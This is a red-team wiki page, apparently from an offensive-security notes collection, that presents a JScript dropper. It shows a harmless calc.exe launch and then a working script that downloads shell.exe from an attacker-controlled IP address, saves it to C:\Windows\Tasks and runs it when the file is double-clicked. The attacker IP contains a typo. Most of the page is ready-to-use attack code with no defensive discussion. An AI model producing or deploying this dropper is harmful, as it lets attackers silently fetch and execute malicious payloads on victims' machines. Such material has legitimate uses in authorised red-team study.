---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/execution/jscript-dropper
---

# JScript Dropper

<figure><img src="../../../.gitbook/assets/image (893).png" alt=""><figcaption></figcaption></figure>

Double click jscript file and it will execute

```javascript
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("calc.exe");
```

<figure><img src="../../../.gitbook/assets/image (894).png" alt=""><figcaption></figcaption></figure>

JScript dropper delivers and executes executables on targets with just a double-click on the file

```javascript
var url = "http://192.168.1t9.134/shell.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.open('GET', url, false);
Object.send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("C:\Windows\Tasks\shell.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("C:\Windows\Tasks\shell.exe");
```

**cscript.exe** (for command-line scripts) and **wscript.exe** (for UI scripts)
